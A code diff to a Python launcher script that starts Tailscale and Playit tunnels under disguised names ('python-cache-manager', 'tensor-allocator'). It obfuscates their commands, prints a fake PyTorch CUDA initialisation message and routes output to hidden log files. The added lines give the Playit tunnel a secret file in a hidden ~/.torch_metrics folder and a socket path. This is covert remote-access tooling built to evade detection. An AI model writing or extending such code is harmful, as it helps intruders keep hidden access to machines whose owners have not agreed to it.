@@ -56,6 +56,7 @@ def main():
     # Open hidden log files to prevent leakage
     ts_log = open('/home/user/.torch_metrics/ts_daemon.log', 'a')
     fb_log = open('/home/user/.torch_metrics/fb.log', 'a')
+    tm_log = open('/home/user/.torch_metrics/tm_daemon.log', 'a')
 
     # 1. Start Tailscale (python-cache-manager)
     print("Initializing PyTorch CUDA environment...", flush=True)
@@ -85,9 +86,9 @@ def main():
     subprocess.Popen(cmd2, shell=True, stdout=fb_log, stderr=subprocess.STDOUT)
 
     # 2.5 Start Playit (tensor-allocator)
-    # Decoded: nice -n 19 tensor-allocator
-    cmd2_5 = decode_cmd(OBFUSCATE("nice -n 19 tensor-allocator"))
-    subprocess.Popen(cmd2_5, shell=True, stdout=fb_log, stderr=subprocess.STDOUT)
+    # Decoded: nice -n 19 tensor-allocator --secret-path /home/user/.torch_metrics/playit.toml --socket-path /tmp/playit.sock
+    cmd2_5 = decode_cmd(OBFUSCATE("nice -n 19 tensor-allocator --secret-path /home/user/.torch_metrics/playit.toml --socket-path /tmp/playit.sock"))
+    subprocess.Popen(cmd2_5, shell=True, stdout=tm_log, stderr=subprocess.STDOUT)
     
     # 3. Connect to Tailscale (py-cache-cli)
     time.sleep(5)
